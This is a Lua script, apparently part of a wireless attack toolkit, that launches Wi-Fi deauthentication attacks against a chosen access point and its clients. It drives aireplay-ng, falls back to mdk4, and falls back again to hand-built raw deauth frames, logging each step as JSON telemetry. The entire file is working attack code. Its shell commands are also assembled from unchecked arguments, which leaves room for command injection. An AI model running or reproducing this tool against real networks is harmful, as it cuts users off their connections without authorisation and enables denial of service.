local iface = arg[1]
local bssid = arg[2]
local station = arg[3] or "ff:ff:ff:ff:ff:ff"
local count = tonumber(arg[4]) or 1
local reason = tonumber(arg[5]) or 7

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"Interface not in monitor mode"}')
  return false
end

local reason_codes = {
  [1] = "Unspecified",
  [4] = "Disassociated due to inactivity",
  [5] = "AP is unable to handle all currently associated stations",
  [6] = "Class 2 frame received from non-authenticated station",
  [7] = "Class 3 frame received from non-associated station",
  [8] = "Disassociated because sending station is leaving BSS",
  [9] = "Station requesting (re)association is not authenticated"
}

local function build_deauth_frame()
  -- Frame control: management, subtype 12 (deauth)
  local frame = string.char(0xa0, 0x00)
  -- Duration
  frame = frame .. string.char(0x00, 0x00)
  -- Destination (station)
  for b in station:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  -- Source (AP / BSSID)
  for b in bssid:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  -- BSSID
  for b in bssid:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  -- Fragment/sequence number
  frame = frame .. string.char(0x00, 0x00)
  -- Deauth reason code
  frame = frame .. string.char(reason % 256, math.floor(reason / 256))

  return frame
end

local function deauth_via_aireplay()
  local cmd = "aireplay-ng --deauth " .. count .. " -a " .. bssid
  if station ~= "ff:ff:ff:ff:ff:ff" then
    cmd = cmd .. " -c " .. station
  end
  cmd = cmd .. " " .. iface .. " 2>/dev/null"

  telemetry("deauth_start", '{"method":"aireplay","cmd":' .. json_escape(cmd) .. ',"reason":' .. tostring(reason) .. ',"reason_text":' .. json_escape(reason_codes[reason] or "Unknown") .. ',"count":' .. tostring(count) .. '}')

  local f = io.popen(cmd)
  if not f then
    telemetry("deauth_fail", '{"method":"aireplay","error":"Failed to start aireplay-ng"}')
    return false
  end

  local sent = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Deauth") or line:find("deauth") then
      sent = sent + 1
      telemetry("deauth_sent", '{"packet":' .. tostring(sent) .. ',"detail":' .. json_escape(line:sub(1, 150)) .. '}')
    end
    if line:find("ack") or line:find("ACK") then
      telemetry("deauth_ack", '{"detail":' .. json_escape(line:sub(1, 150)) .. '}')
    end
  end

  local _, _, rc = f:close()
  telemetry("deauth_complete", '{"method":"aireplay","sent":' .. tostring(sent) .. ',"exit_code":' .. tostring(rc or -1) .. '}')
  return sent > 0
end

local function deauth_via_mdk4()
  local cmd = "mdk4 " .. iface .. " d -a " .. bssid
  if station ~= "ff:ff:ff:ff:ff:ff" then
    cmd = cmd .. " -c " .. station
  end
  cmd = cmd .. " -s " .. tostring(count) .. " 2>/dev/null"

  telemetry("deauth_start", '{"method":"mdk4","cmd":' .. json_escape(cmd) .. '}')

  local f = io.popen(cmd)
  if not f then
    telemetry("deauth_fail", '{"method":"mdk4","error":"Failed to start mdk4"}')
    return false
  end

  local sent = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Packet") or line:find("packet") then
      sent = sent + 1
      telemetry("deauth_sent", '{"packet":' .. tostring(sent) .. '}')
    end
  end

  f:close()
  telemetry("deauth_complete", '{"method":"mdk4","sent":' .. tostring(sent) .. '}')
  return sent > 0
end

local function deauth_raw()
  local frame = build_deauth_frame()
  local tmp = "/tmp/deauth_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then
    telemetry("deauth_fail", '{"method":"raw","error":"Cannot write temp file"}')
    return false
  end
  for i = 1, count do
    f:write(frame)
  end
  f:close()

  telemetry("deauth_raw", '{"count":' .. tostring(count) .. ',"file":' .. json_escape(tmp) .. '}')
  local cmd = "cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null"
  os.execute(cmd)
  telemetry("deauth_complete", '{"method":"raw","sent":' .. tostring(count) .. '}')
  return true
end

if not iface or not bssid then
  telemetry("error", '{"error":"Usage: deauth.lua <interface> <bssid> [station] [count] [reason]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

local ok = deauth_via_aireplay()
if not ok then
  telemetry("fallback", '{"message":"aireplay-ng failed, trying mdk4"}')
  ok = deauth_via_mdk4()
end
if not ok then
  telemetry("fallback", '{"message":"mdk4 failed, trying raw injection"}')
  deauth_raw()
end

telemetry("complete", '{"total_deauth":' .. tostring(count) .. '}')
